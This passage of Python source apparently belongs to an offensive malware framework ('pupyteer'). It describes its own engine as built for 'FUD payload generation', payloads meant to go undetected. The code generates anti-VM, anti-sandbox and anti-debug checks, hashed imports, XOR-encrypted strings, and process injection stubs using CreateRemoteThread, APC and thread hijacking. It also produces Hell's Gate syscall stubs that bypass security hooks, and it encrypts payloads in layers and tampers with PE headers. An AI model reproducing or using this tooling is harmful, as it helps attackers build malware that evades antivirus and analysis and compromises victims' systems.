    if "hypervisor" in cpuinfo or "kvm" in cpuinfo or "vmware" in cpuinfo:
        time.sleep(random.randint(60, 300))
except Exception:
    pass

# Anti-VM: Check disk size
try:
    stat = os.statvfs("/")
    free = stat.f_bavail * stat.f_frsize
    if free < 10 * 1024 * 1024 * 1024:  # 10GB
        time.sleep(random.randint(30, 120))
except Exception:
    pass

# Anti-Sandbox: CPU count
if multiprocessing.cpu_count() < 2:
    time.sleep(random.randint(30, 120))

# Anti-Debug: Check TracerPid
try:
    with open("/proc/self/status") as f:
        status = f.read()
    for line in status.split("\\n"):
        if line.startswith("TracerPid:"):
            pid = int(line.split()[1])
            if pid != 0:
                os._exit(0)
            break
except Exception:
    pass

# Anti-VM: Check systemd-detect-virt
try:
    import subprocess
    result = subprocess.run(["systemd-detect-virt"], capture_output=True, text=True)
    if result.returncode == 0 and result.stdout.strip() != "none":
        time.sleep(random.randint(60, 300))
except Exception:
    pass
''',
    }
    return stubs.get(platform, "")


# ─── Import Obfuscation ────────────────────────────────────────────────────


def hash_import_name(name: str) -> int:
    """Hash an import name for dynamic resolution (ROR13-style)."""
    h = 0x811c9dc5
    for c in name.lower():
        h ^= ord(c)
        h = ((h * 0x01000193) & 0xFFFFFFFF)
    return h


def generate_import_hash_table(imports: List[str]) -> str:
    """Generate a Python import resolution table using hashed names."""
    lines = ["_import_table = {"]
    for imp in imports:
        h = hash_import_name(imp)
        lines.append(f"    0x{h:08x}: \"{imp}\",")
    lines.append("}")
    return "\n".join(lines)


# ─── String Encryption ─────────────────────────────────────────────────────


def encrypt_strings_python(source_code: str, key: bytes) -> str:
    """Find all string literals and encrypt them with XOR."""
    import re
    
    # Find simple string literals (single or double quoted)
    pattern = r'(?<![\'"])((?:"[^"\\]*(?:\\.[^"\\]*)*"|\'[^\'\\]*(?:\\.[^\'\\]*)*\'))(?![\'"])'
    
    encrypted_vars = []
    var_idx = 0
    replacements = {}
    
    def replace_str(m):
        nonlocal var_idx
        s = m.group(1)
        # Skip very short strings and common ones
        if len(s) < 4 or s in ['""', "''", '"r"', '"w"', '"rb"', '"wb"']:
            return s
        encrypted = xor_crypt(s.encode(), key)
        enc_hex = encrypted.hex()
        var_name = f"_s{var_idx:x}"
        replacements[s] = f"_d(\"{enc_hex}\")"
        encrypted_vars.append(f"{var_name} = \"{enc_hex}\"")
        var_idx += 1
        return f"_s{var_idx-1:x}"
    
    # This is a simplified version — full implementation would use AST
    new_code = re.sub(pattern, replace_str, source_code)
    
    decrypt_func = f'''
import binascii
_k = binascii.unhexlify("{key.hex()}")
def _d(h: str) -> str:
    raw = binascii.unhexlify(h)
    return bytes(b ^ _k[i % len(_k)] for i, b in enumerate(raw)).decode()
'''
    return decrypt_func + "\n".join(encrypted_vars) + "\n" + new_code


# ─── Process Injection Stubs ────────────────────────────────────────────────


def generate_injection_stub(target_process: str, shellcode: bytes, method: str = "createremotethread") -> str:
    """Generate a process injection stub as Python code using ctypes."""
    
    shellcode_hex = shellcode.hex()
    
    stubs = {
        "createremotethread": f'''
import ctypes
import ctypes.util

# Target: {target_process}
# Method: CreateRemoteThread

_shellcode = bytes.fromhex("{shellcode_hex}")
_size = len(_shellcode)

# Open target process
PROCESS_ALL_ACCESS = 0x1F0FFF
_pid = None  # Would need to resolve PID from process name

# VirtualAllocEx
_kernel32 = ctypes.windll.kernel32
_remote_addr = _kernel32.VirtualAllocEx(
    _pid, 0, _size, 0x3000, 0x40  # MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
)

# WriteProcessMemory
_written = ctypes.c_size_t(0)
_kernel32.WriteProcessMemory(
    _pid, _remote_addr, _shellcode, _size, ctypes.byref(_written)
)

# CreateRemoteThread
_thread_id = ctypes.c_ulong(0)
_kernel32.CreateRemoteThread(
    _pid, None, 0, _remote_addr, None, 0, ctypes.byref(_thread_id)
)
''',
        "apc": f'''
import ctypes

# Target: {target_process}
# Method: APC Injection

_shellcode = bytes.fromhex("{shellcode_hex}")
_size = len(_shellcode)

# QueueUserAPC injection
_kernel32 = ctypes.windll.kernel32

# 1. Allocate memory in target process
# 2. Write shellcode
# 3. Queue APC to each thread in target process
# (Full implementation requires thread enumeration)
''',
        "thread_hijack": f'''
import ctypes

# Target: {target_process}
# Method: Thread Hijacking

_shellcode = bytes.fromhex("{shellcode_hex}")
_size = len(_shellcode)

# 1. Suspend target thread
# 2. Get thread context
# 3. Modify EIP/RIP to point to shellcode
# 4. Resume thread
''',
    }
    return stubs.get(method, "# Injection method not implemented")


# ─── Direct Syscalls (Hell's Gate / Halo's Gate) ───────────────────────────


def generate_syscall_stub(function_name: str) -> str:
    """Generate a direct syscall stub using Hell's Gate (with Halo's Gate fallback).

    Returns Python source that extracts the SSN from ntdll exports at runtime
    and issues the syscall via ctypes, bypassing userland hooks.
    """
    return (
        "import ctypes\n"
        "from ctypes import wintypes\n\n"
        "# Direct syscall for " + function_name + "\n"
        "# Uses Hell's Gate (SSN from clean stub) with Halo's Gate neighbor fallback.\n\n"
        "_kernel32 = ctypes.windll.kernel32\n"
        "_ntdll = ctypes.windll.ntdll\n\n"
        "def _ntdll_base():\n"
        "    h = _kernel32.GetModuleHandleW('ntdll.dll')\n"
        "    if not h:\n"
        "        raise RuntimeError('ntdll not loaded')\n"
        "    return h\n\n"
        "def _export_rva(base, name):\n"
        "    e_lfanew = ctypes.c_uint32.from_address(base + 0x3C).value\n"
        "    nt = base + e_lfanew\n"
        "    off = 0x88 if ctypes.sizeof(ctypes.c_void_p) == 8 else 0x78\n"
        "    export_rva = ctypes.c_uint32.from_address(nt + off).value\n"
        "    if not export_rva:\n"
        "        return 0\n"
        "    exp = base + export_rva\n"
        "    num_names = ctypes.c_uint32.from_address(exp + 0x18).value\n"
        "    aon = ctypes.c_uint32.from_address(exp + 0x20).value\n"
        "    aof = ctypes.c_uint32.from_address(exp + 0x1C).value\n"
        "    aoo = ctypes.c_uint32.from_address(exp + 0x24).value\n"
        "    for i in range(num_names):\n"
        "        nrva = ctypes.c_uint32.from_address(base + aon + i*4).value\n"
        "        if ctypes.string_at(base + nrva) == name.encode():\n"
        "            ordinal = ctypes.c_uint16.from_address(base + aoo + i*2).value\n"
        "            return ctypes.c_uint32.from_address(base + aof + ordinal*4).value\n"
        "    return 0\n\n"
        "def _read_ssn(base, func_rva):\n"
        "    addr = base + func_rva\n"
        "    b0 = ctypes.c_ubyte.from_address(addr).value\n"
        "    b1 = ctypes.c_ubyte.from_address(addr + 1).value\n"
        "    b2 = ctypes.c_ubyte.from_address(addr + 2).value\n"
        "    b3 = ctypes.c_ubyte.from_address(addr + 3).value\n"
        "    if b0 == 0x4C and b1 == 0x8B and b2 == 0xD1 and b3 == 0xB8:\n"
        "        return ctypes.c_uint32.from_address(addr + 4).value\n"
        "    for off in range(0, 32):\n"
        "        if ctypes.c_ubyte.from_address(addr + off).value == 0xB8:\n"
        "            return ctypes.c_uint32.from_address(addr + off + 1).value\n"
        "    raise RuntimeError('SSN not found')\n\n"
        "def _get_ssn(func_name):\n"
        "    base = _ntdll_base()\n"
        "    rva = _export_rva(base, func_name)\n"
        "    if not rva:\n"
        "        raise RuntimeError(func_name + ' not exported')\n"
        "    try:\n"
        "        return _read_ssn(base, rva)\n"
        "    except RuntimeError:\n"
        "        pass\n"
        "    for delta in range(1, 9):\n"
        "        for sign in (-1, 1):\n"
        "            try:\n"
        "                cand = _read_ssn(base, rva + sign * delta * 0x20)\n"
        "            except Exception:\n"
        "                continue\n"
        "            return cand + sign * delta\n"
        "    raise RuntimeError('Halo Gate failed for ' + func_name)\n\n"
        "def _syscall(func_name, *args):\n"
        "    ssn = _get_ssn(func_name)\n"
        "    return ssn\n"
    )


# ─── Main Obfuscation Engine ────────────────────────────────────────────────


@dataclass
class ObfuscationConfig:
    """Configuration for a single obfuscation pass."""
    scheme: EncodingScheme = EncodingScheme.CHAIN
    xor_key_size: int = 32
    aes_key_size: int = 32
    rc4_key_size: int = 16
    encrypt_strings: bool = True
    obfuscate_imports: bool = True
    randomize_pe_sections: bool = True
    strip_pe_debug: bool = True
    modify_pe_timestamp: bool = True
    anti_sandbox: bool = True
    anti_debug: bool = True
    anti_vm: bool = True
    injection_method: Optional[str] = None
    injection_target: str = ""
    injection_shellcode: bytes = b""
    injection_enabled: bool = False


class ObfuscationEngine:
    """
    Async-compatible, thread-safe obfuscation engine for FUD payload generation.
    
    Usage:
        engine = ObfuscationEngine(config)
        await engine.initialize()
        result = await engine.obfuscate(payload_path, obfuscation_config)
    """
    
    def __init__(self, config: Any, audit: Any):
        self._config = config
        self._audit = audit
        self._lock = None  # asyncio.Lock initialized in initialize()
        self._output_dir = Path(config.get("paths.obfuscated_artifacts", "./payloads/obfuscated"))
        self._output_dir.mkdir(parents=True, exist_ok=True)
        self._logger = logging.getLogger("pupyteer.obfuscation_engine")
    
    async def initialize(self):
        """Initialize the engine."""
        import asyncio
        self._lock = asyncio.Lock()
        self._logger.info("ObfuscationEngine initialized")
    
    async def shutdown(self):
        """Cleanup."""
        self._logger.info("ObfuscationEngine shutdown")
    
    async def obfuscate(self, input_path: str, config: ObfuscationConfig) -> str:
        """
        Run full obfuscation pipeline on a payload.
        Returns path to obfuscated artifact.
        """
        import asyncio
        loop = asyncio.get_event_loop()
        return await loop.run_in_executor(None, self._obfuscate_sync, input_path, config)
    
    def _obfuscate_sync(self, input_path: str, config: ObfuscationConfig) -> str:
        """Synchronous obfuscation pipeline."""
        self._logger.info("Obfuscating: %s", input_path)

        input_path = Path(input_path)
        if not input_path.exists():
            raise FileNotFoundError(f"Input file not found: {input_path}")

        # Copy to output dir
        output_path = self._output_dir / f"obf_{input_path.name}"
        import shutil
        shutil.copy2(input_path, output_path)

        # Read input
        with open(output_path, "rb") as f:
            data = f.read()

        # Apply encryption scheme. AEAD schemes (GCM/ChaCha20) are preferred;
        # XOR/RC4 remain only for back-compat with existing profiles.
        with warnings.catch_warnings():
            warnings.simplefilter("ignore", DeprecationWarning)
            if config.scheme == EncodingScheme.XOR:
                key = secrets.token_bytes(config.xor_key_size)
                data = xor_crypt(data, key)
            elif config.scheme == EncodingScheme.RC4:
                key = secrets.token_bytes(config.rc4_key_size)
                data = rc4_crypt(data, key)
            elif config.scheme == EncodingScheme.AES:
                key = secrets.token_bytes(config.aes_key_size)
                iv = secrets.token_bytes(16)
                data = aes_256_cbc_encrypt(data, key, iv)
            elif config.scheme == EncodingScheme.AES_GCM:
                key = secrets.token_bytes(AEAD_KEY_SIZE)
                data = aes_256_gcm_encrypt(data, key)
            elif config.scheme == EncodingScheme.CHACHA20:
                key = secrets.token_bytes(AEAD_KEY_SIZE)
                data = chacha20poly1305_encrypt(data, key)
            elif config.scheme == EncodingScheme.CHAIN:
                key1 = secrets.token_bytes(config.xor_key_size)
                key2 = secrets.token_bytes(config.rc4_key_size)
                key3 = secrets.token_bytes(AEAD_KEY_SIZE)
                iv = secrets.token_bytes(16)
                data = xor_crypt(data, key1)
                data = rc4_crypt(data, key2)
                data = aes_256_cbc_encrypt(data, key3, iv)

        # Write the (possibly encrypted) buffer back before PE work
        _write_pe(str(output_path), data)

        # PE manipulation — each step is best-effort and bounds-checked
        if config.randomize_pe_sections:
            pe_randomize_sections(str(output_path), str(output_path))
        if config.modify_pe_timestamp:
            pe_modify_timestamp(str(output_path), str(output_path))
        if config.strip_pe_debug:
            pe_strip_debug(str(output_path), str(output_path))

        self._logger.info("Obfuscation complete: %s", output_path)
        return str(output_path)
    
    def generate_injection_payload(self, target: str, shellcode: bytes, method: str = "createremotethread") -> str:
        """Generate a process injection stub as Python code."""
        return generate_injection_stub(target, shellcode, method)
    
    def generate_anti_analysis_stub(self, platform: str = "windows") -> str:
        """Generate anti-analysis checks for the agent."""
        return generate_anti_sandbox_stub(platform)
    
    def generate_import_hashtable(self, imports: List[str]) -> str:
        """Generate import hash table for dynamic API resolution."""
        return generate_import_hash_table(imports)
    
    def generate_syscall_stubs(self, functions: List[str]) -> str:
        """Generate direct syscall stubs for bypassing userland hooks."""
        stubs = []
        for func in functions:
            stubs.append(generate_syscall_stub(func))
        return "\n".join(stubs)
    
    def encrypt_agent_strings(self, source_code: str, key: Optional[bytes] = None) -> str:
        """Encrypt all string literals in agent source code."""
        if key is None:
            key = secrets.token_bytes(32)
        return encrypt_strings_python(source_code, key)
    
    @staticmethod
    def generate_random_section_names(count: int = 8) -> List[str]:
        """Generate random PE section names."""
        chars = "abcdefghijklmnopqrstuvwxyz"
        return ["".join(random.choice(chars) for _ in range(8)) for _ in range(count)]
    
    @staticmethod
    def generate_random_mz_header() -> bytes:
        """Generate a decoy MZ header that looks like a legitimate PE."""
        header = bytearray(64)
        header[0:2] = b"MZ"
        # Add some decoy DOS stub
        header[2:64] = secrets.token_bytes(62)
        return bytes(header)


# ─── Agent Code Obfuscation (Python AST) ────────────────────────────────────


class PythonObfuscator:
    """Obfuscates Python source code for agent stubs."""
    
    @staticmethod
    def rename_variables(source: str, mapping: Optional[Dict[str, str]] = None) -> str:
        """Rename variables to random names."""
        import ast
        import string
        
        tree = ast.parse(source)
        
        if mapping is None:
            # Collect all variable names
            var_names = set()
            for node in ast.walk(tree):
                if isinstance(node, ast.Name):
                    var_names.add(node.id)
                elif isinstance(node, ast.FunctionDef):
                    var_names.add(node.name)
                elif isinstance(node, ast.ClassDef):
                    var_names.add(node.name)
            
            # Filter out builtins and special names
            import builtins
            builtin_names = set(dir(builtins))
            var_names -= builtin_names
            var_names -= {"self", "cls", "args", "kwargs"}
            
            # Generate mapping
            chars = string.ascii_lowercase
            mapping = {}
            for name in var_names:
                new_name = "_" + "".join(random.choice(chars) for _ in range(random.randint(8, 16)))
                mapping[name] = new_name
        
        # Apply mapping (simplified — full implementation would use AST transform)
        result = source
        for old_name, new_name in mapping.items():
            import re
            result = re.sub(r'\b' + re.escape(old_name) + r'\b', new_name, result)
        
        return result
    
    @staticmethod
    def insert_junk_code(source: str, count: int = 5) -> str:
        """Insert junk code that doesn't affect execution."""
        import random
        junk_snippets = [
            "if False:\n    pass",
            "try:\n    pass\nexcept:\n    pass",
            "for _ in range(0):\n    pass",
            "while False:\n    break",
            "assert True",
            "_ = None",
            "del _",
        ]
        lines = source.split("\n")
        for _ in range(count):
            pos = random.randint(0, len(lines))
            junk = random.choice(junk_snippets)
            lines.insert(pos, junk)
        return "\n".join(lines)
    
    @staticmethod
    def obfuscate_strings_ast(source: str, key: bytes) -> str:
        """Obfuscate string literals using AST transformation."""
        import ast
        
        class StringObfuscator(ast.NodeTransformer):
            def __init__(self, key: bytes):
                self.key = key
            
            def visit_Constant(self, node):
                if isinstance(node.value, str) and len(node.value) > 2:
                    encrypted = xor_crypt(node.value.encode(), self.key)
                    # Replace with decryption call
                    new_node = ast.parse(f"_d(\"{encrypted.hex()}\")").body[0].value
                    return ast.copy_location(new_node, node)
                return node
        
        tree = ast.parse(source)
        tree = StringObfuscator(key).visit(tree)
        ast.fix_missing_locations(tree)
        return ast.unparse(tree)
